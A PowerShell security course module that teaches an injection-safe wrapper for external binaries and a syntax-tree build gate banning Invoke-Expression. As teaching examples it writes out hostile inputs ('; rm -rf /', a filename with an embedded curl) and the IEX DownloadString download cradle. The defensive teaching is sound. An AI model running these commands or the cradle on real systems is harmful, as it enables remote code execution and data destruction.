# Module 05 — Driving Tools & External Processes Safely

*Type 9 · Tool-Build — build the reusable, injection-safe wrapper that lets `Vigil` shell out to external binaries (a hash tool, a YARA scan, `nslookup`) without ever building a command line from strings. (Secondary: Type 14 · Adversarial Review — add an AST review gate that fails the build on `Invoke-Expression`.) [Go to the hands-on lab →](lab.md)* &nbsp;·&nbsp; *[Cheat sheet →](cheatsheet.md)*

*Last reviewed: 2026-07*

**PowerShell for Security** — *the copilot reaches for `Invoke-Expression` because ten years of its training data did; your edge is the argument array that makes injection structurally impossible.*

!!! abstract "In 60 seconds"
    Real hunt tooling has to shell out — to a hashing binary, a YARA scan, `nslookup`, a sandbox CLI — and
    the moment a filename or an indicator from your telemetry reaches that external process, you have an
    injection surface. The copilot's default here is the single most dangerous idiom in PowerShell:
    `Invoke-Expression` over a string it *built* by concatenating your data into a command line. This
    module builds `Invoke-VigilTool` the safe way — external binaries called via **argument arrays** (the
    native call operator with `@args`, or `Start-Process -ArgumentList`), where each argument is passed as
    a *discrete token* the shell never re-parses, so `; rm -rf /` in a filename is treated as **data, not
    a command**. Then you add a review gate that most humans skip: an **AST scan** that walks the parsed
    syntax tree of every script and *fails the build* if it finds `Invoke-Expression` or `iex`. The anchor
    is MITRE ATT&CK **T1059.001** and the `IEX (New-Object Net.WebClient).DownloadString(...)` download
    cradle — the exact pattern you're learning never to write is the exact pattern attackers abuse daily.

## Why this matters

Every real security tool eventually drives another tool. `Vigil` normalizes events (Module 02–03) and
enriches indicators (Module 04) — but at some point it needs to hash a dropped file, run a YARA rule over
a sample, or resolve a domain, and none of that is native PowerShell. It shells out. The instant an
external process is in the loop, the question is no longer "does it work" but "**what happens when the
input is hostile**" — because in a hunt tool the input *is* attacker-controlled telemetry: filenames,
command lines, domains lifted straight from the events you're triaging.

Ask a copilot to "run `sha256sum` on this file from PowerShell" and a large fraction of the time you get
`Invoke-Expression "sha256sum $path"` — a string it concatenated your `$path` into, then handed to a
second interpreter to re-parse. If `$path` is `evil.txt; curl http://x/`  , you didn't hash a file, you
ran the attacker's command. This is textbook **command injection**, and it is the copilot's *default*
because Windows PowerShell 5.1 code from the last decade — the bulk of its training data — is saturated
with `Invoke-Expression` and string-built command lines. The failure isn't exotic; it's the normal
output you have to know to reject.

The teeth-grinding part: the very idiom you must never write is the one **T1059.001** documents attackers
using constantly. `IEX (New-Object Net.WebClient).DownloadString('http://.../a.ps1')` — the download
cradle — *is* `Invoke-Expression` fed a string fetched from the network and executed in memory, no file
on disk. Learning to build `Invoke-VigilTool` without `Invoke-Expression` and learning to *detect* the
cradle are the same lesson from two sides: string execution is the vulnerability and the attack.

## Objective

Build `Invoke-VigilTool` — a reusable advanced function that runs an external binary with an
attacker-controlled argument passed **as data**, never interpolated into a command string — using an
argument array (`Start-Process -ArgumentList` and/or the native call operator with `@args`), with robust
parsing of the tool's output into typed objects and a non-zero-exit-code check. Then add an **AST review
gate** that parses every `.ps1` and fails on any `Invoke-Expression`/`iex`, and write `Pester` tests that
**feed a hostile argument** (`; rm -rf`, `$(...)`) and prove it is treated as an inert string, not
executed.

## The core idea

**An argument array is a trust boundary; a command string is a hole in it.** When you write
`& $exe $arg1 $arg2` (the native call operator) or `Start-Process -FilePath $exe -ArgumentList @($arg1,
$arg2)`, PowerShell passes each argument to the new process as a **discrete element of its argv** — the
process receives `arg1` and `arg2` as separate, already-tokenized strings, and *no shell re-parses them*.
A `;`, a `$(...)`, a backtick, a space, a quote inside `$arg1` is just bytes in that one argument. When
you instead build `"$exe $arg1 $arg2"` into a single string and run it, you've thrown away the tokenization
and handed a fresh interpreter the job of splitting it again — and now the metacharacters in your data
*are* syntax. The array keeps data and code separate by construction; the string melts them together.
This is the same parameterized-query-vs-string-concatenation lesson as SQL injection, in a different
interpreter.

**`Invoke-Expression` is not "run a command" — it's "run whatever this string turns out to be."** `iex`
takes a string and executes it *as PowerShell source* in your session. There is almost never a legitimate
reason for it in tooling: if you know the command at author-time, call it directly; if you're building it
from data, you've just built an injection. `PSScriptAnalyzer`'s `PSAvoidUsingInvokeExpression` rule
flags it precisely because its safe uses are so rare they're not worth the risk of the unsafe ones. The
practitioner rule is blunt: **`Invoke-Expression` is banned in `Vigil`, full stop** — and you enforce the
ban mechanically, not by remembering.

**Parse the tool's output back into objects — don't stop at a string.** The wrapper's other half is the
return path: an external binary hands you stdout as text, and the amateur move is to return that text.
The `Vigil` discipline (the track's through-line) is to parse it — split the hash from the filename, read
the exit code, capture stderr separately — and emit a `[pscustomobject]` with named fields plus a
`Success`/`ExitCode`. A wrapper that returns typed results is one your detection logic can *reason about*;
one that returns a blob is one the next module has to re-parse. And always check the exit code: a tool
that failed and a tool that found nothing look identical if you only read stdout.

**The AST gate is how you make "no `Invoke-Expression`" un-forgettable.** A grep for `iex` is fooled by
comments and strings; the honest check parses the code. `[System.Management.Automation.Language.Parser]::
ParseFile(...)` gives you the real abstract syntax tree, and `.FindAll(...)` lets you find every
`CommandAst` whose name is `Invoke-Expression` or `iex` — actual invocations, not the word appearing in a
doc comment. Wired into the gate, it turns the ban from a code-review hope into a build failure. This is
the Type 14 move in miniature: you don't trust yourself (or the copilot) to *never* write the dangerous
thing; you write the check that catches it and let it run every time.

??? note "The legitimate exceptions — and why `Vigil` still bans it"
    Are there real uses of `Invoke-Expression`? A few: expanding a here-string template you fully control,
    some REPL/tooling metaprogramming. But every one of them can be written another way (`&`
    scriptblocks, splatting, `[scriptblock]::Create` with a reviewed literal), and none of them appear in
    a *security hunt tool* that processes untrusted telemetry. So the project rule isn't "usually avoid" —
    it's a hard gate. If you ever genuinely need dynamic execution, that's a design conversation and an
    ADR, not a line the copilot slips into a wrapper. The cost of the occasional friction is tiny next to
    the cost of one injected command line in a tool that runs against attacker data.

## Learn (~2–3 hrs)

**Calling external tools the safe way (do these first)**

- [Microsoft Learn — "about_Operators": the call operator `&`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_operators#call-operator-) (~15 min)
  — the native way to invoke a binary or scriptblock; read specifically how `&` with a variable path and
  splatted `@args` passes arguments as an array, not a string. This is the core primitive of the wrapper.
- [Microsoft Learn — `Start-Process` (`-ArgumentList`, `-Wait`, redirection)](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/start-process) (~15 min)
  — the other safe path: `-ArgumentList @(...)` passes discrete args, and `-RedirectStandardOutput`/
  `-RedirectStandardError` let you capture streams separately. Read the `-ArgumentList` and redirection
  parameters and skip the rest.
- [Microsoft Learn — `about_Splatting`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_splatting) (~10 min)
  — how `@args` and hashtable/array splatting forward parameters cleanly; the mechanism that lets you
  build an argument *array* from data instead of a command *string*.

**Why string execution is the wound (`Invoke-Expression`)**

- [`PSScriptAnalyzer` rule `AvoidUsingInvokeExpression`](https://learn.microsoft.com/en-us/powershell/utility-modules/psscriptanalyzer/rules/avoidusinginvokeexpression) (~10 min)
  — the linter rule and its one-paragraph rationale: `Invoke-Expression` can run arbitrary code, so avoid
  it. Short, and it's the rule your gate will lean on alongside the AST check.
- [PowerShell AST — `Parser`/`Ast.FindAll` (SDK reference)](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.language.parser) (~20 min)
  — read `ParseFile`/`ParseInput` and the `Ast.FindAll` predicate pattern; this is how you scan for
  `Invoke-Expression` as a real command node instead of grepping text.

**The anchor — the download cradle you're learning to never write**

- [MITRE ATT&CK — T1059.001 · Command and Scripting Interpreter: PowerShell](https://attack.mitre.org/techniques/T1059/001/) (~15 min)
  — the technique. Read the "Procedure Examples" and note how many are literally `IEX (New-Object
  Net.WebClient).DownloadString(...)`. The idiom your wrapper bans is the idiom this technique catalogs.
- [Atomic Red Team — T1059.001 atomic tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md) (~10 min)
  — concrete, runnable-in-a-lab test definitions built around `IEX ... DownloadString`. Read a couple to
  see the cradle spelled out; it's the same `Invoke-Expression`-a-fetched-string shape, weaponized.

## Key concepts
- **Argument array = trust boundary.** `& $exe @args` / `Start-Process -ArgumentList @(...)` pass discrete tokens no shell re-parses — metacharacters in data stay data.
- **Command string = injection.** Building `"$exe $arg"` and running it hands a fresh interpreter your data as syntax. This is command injection.
- **`Invoke-Expression`/`iex` is banned in `Vigil`.** It runs a string as source; in a tool over untrusted telemetry there is no safe use. Enforce the ban, don't remember it.
- **Parse output to objects + check the exit code.** Return `[pscustomobject]` with named fields and `ExitCode`/`Success` — not a stdout blob; a failed tool and an empty result look identical otherwise.
- **AST gate, not grep.** `[Parser]::ParseFile` + `Ast.FindAll` finds real `Invoke-Expression` command nodes (not the word in a comment) and fails the build.
- **The anchor is the mirror.** T1059.001's `IEX ... DownloadString` cradle *is* the string-execution pattern — building safely and detecting the attack are one lesson.

## AI acceleration

Use the copilot to draft `Invoke-VigilTool`, then hunt its default. The tell is near-certain: asked to
"run an external tool with this argument from PowerShell," the model reaches for `Invoke-Expression` or
string interpolation (`& "$exe $arg"`, `cmd /c "$exe $arg"`) far more often than for a clean argument
array — because that's what a decade of 5.1 code taught it. Your job is to reject that draft and specify
the array form, then *prove* it: feed the wrapper a hostile argument and assert nothing executed. Then
let the copilot help build the very check that catches it — the AST scan — and review whether it walks
the tree (`FindAll` on `CommandAst`) or just string-matches, which a comment would fool. This is the
"AI authors → you review → you own it" thread made literal: the AI writes the code *and* the gate, and
you own the guarantee that the gate actually holds.

!!! question "Check yourself"
    - Why does `Start-Process -ArgumentList @($path)` treat `evil.txt; rm -rf /` as one filename, while
      `Invoke-Expression "scan $path"` runs the `rm`? Describe where the tokenization happens in each.
    - Give one reason a `grep -r 'iex'` review is weaker than an AST scan for catching
      `Invoke-Expression`. What does the parser see that the grep doesn't?
    - Your wrapper returns a tool's stdout as a string and everyone's happy. What breaks the first time the
      tool exits non-zero, and what should the wrapper have returned instead?
